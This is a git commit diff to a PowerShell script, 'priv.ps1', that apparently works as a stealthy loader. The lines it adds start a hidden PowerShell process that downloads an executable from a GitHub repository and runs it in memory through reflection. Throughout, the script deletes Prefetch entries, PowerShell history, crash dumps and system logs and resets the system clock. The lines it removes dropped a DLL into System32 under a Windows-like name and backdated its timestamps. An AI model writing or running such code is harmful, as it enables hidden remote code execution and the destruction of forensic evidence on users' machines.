6b17f02b739bdfad0f38df996a0c459e8001f2a1
zold1337 <152819963+zold1337@users.noreply.github.com>
2026-06-26 10:55:41 -0300

    Update priv.ps1

--- priv.ps1
+++ priv.ps1
@@ -21,13 +21,12 @@ while ((Get-Date) -lt $timeout) {
 }
 
 if (-not (Get-Process Discord -ErrorAction SilentlyContinue)) {
-    {
-Remove-Item -Path "C:\Windows\Prefetch\POWERSHELL*" -Force -ErrorAction SilentlyContinue
-Remove-Item -Path "C:\Windows\Prefetch\RUNONCE*" -Force -ErrorAction SilentlyContinue
-Remove-Item -Force -ErrorAction SilentlyContinue "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
-Clear-History -ErrorAction SilentlyContinue
-Exit
-    }.Invoke()
+    Remove-Item -Path "C:\Windows\Prefetch\POWERSHELL*" -Force -ErrorAction SilentlyContinue
+    Remove-Item -Path "C:\Windows\Prefetch\RUNONCE*" -Force -ErrorAction SilentlyContinue
+    Remove-Item -Force -ErrorAction SilentlyContinue "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
+    Clear-History -ErrorAction SilentlyContinue
+    Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -Command `"& { $b=(New-Object Net.WebClient).DownloadData('https://github.com/zold1337/toolsvip/raw/refs/heads/main/ST.exe'); $e=[Reflection.Assembly]::Load($b).EntryPoint; $a=New-Object object[] 1; $a[0]=[string[]]@(); $e.Invoke($null, $a) }`""
+    Exit
 }
 
 $invokeArgs = New-Object object[] 1 
@@ -37,19 +36,6 @@ $entry.Invoke($null, $invokeArgs)
 $os = Get-CimInstance Win32_OperatingSystem
 $installDateTime = [Management.ManagementDateTimeConverter]::ToDateTime($os.InstallDate)
 Set-Date -Date $installDateTime
-$ProgressPreference='SilentlyContinue'; Invoke-WebRequest -Uri 'https://github.com/zold1337/toolsvip/raw/refs/heads/main/XD2.dll' -OutFile "C:\Windows\System32\BluetoothDesktopHandlers.dll"
-
-
-$f = "C:\Windows\System32\BluetoothDesktopHandlers.dll"
-$d = (Get-CimInstance Win32_OperatingSystem).InstallDate
-(Get-Item $f).CreationTime = $d
-(Get-Item $f).LastWriteTime = $d
-(Get-Item $f).LastAccessTime = $d
-Set-ItemProperty "$env:windir\System32\BluetoothDesktopHandlers.dll" -Name IsReadOnly -Value $true -ErrorAction SilentlyContinue > $null 2>&1
-net stop w32time > $null 2>&1
-net start w32time > $null 2>&1
-w32tm /resync /force > $null 2>&1
-
 Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "C:\Windows\Logs\CBS\*.log"
 Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "$env:LOCALAPPDATA\CrashDumps\*.dmp"
 Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "C:\Windows\Logs\MoSetup\*.log"
@@ -116,22 +102,15 @@ $services = @(
     "sysmain",
     "eventlog"
 )
-
-Start-Sleep -Seconds 5
 foreach ($svc in $services) {
     Set-Service -Name $svc -StartupType Automatic -ErrorAction SilentlyContinue
 }
+net stop w32time > $null 2>&1
+net start w32time > $null 2>&1
+w32tm /resync /force > $null 2>&1
 Remove-Item -Path "C:\Windows\Prefetch\POWERSHELL*" -Force -ErrorAction SilentlyContinue
 Remove-Item -Path "C:\Windows\Prefetch\RUNONCE*" -Force -ErrorAction SilentlyContinue
 Remove-Item -Force -ErrorAction SilentlyContinue "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
 Clear-History -ErrorAction SilentlyContinue
-
-$link2 = "https://github.com/zold1337/toolsvip/raw/refs/heads/main/ST.exe"
-$webClient2 = New-Object System.Net.WebClient
-$bytes2 = $webClient2.DownloadData($link2)
-$assembly2 = [System.Reflection.Assembly]::Load($bytes2)
-$entry2 = $assembly2.EntryPoint
-$invokeArgs2 = New-Object object[] 1 
-$invokeArgs2[0] = [string[]]@() 
-$entry2.Invoke($null, $invokeArgs2)
+Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -Command `"& { $b=(New-Object Net.WebClient).DownloadData('https://github.com/zold1337/toolsvip/raw/refs/heads/main/ST.exe'); $e=[Reflection.Assembly]::Load($b).EntryPoint; $a=New-Object object[] 1; $a[0]=[string[]]@(); $e.Invoke($null, $a) }`""
 Exit
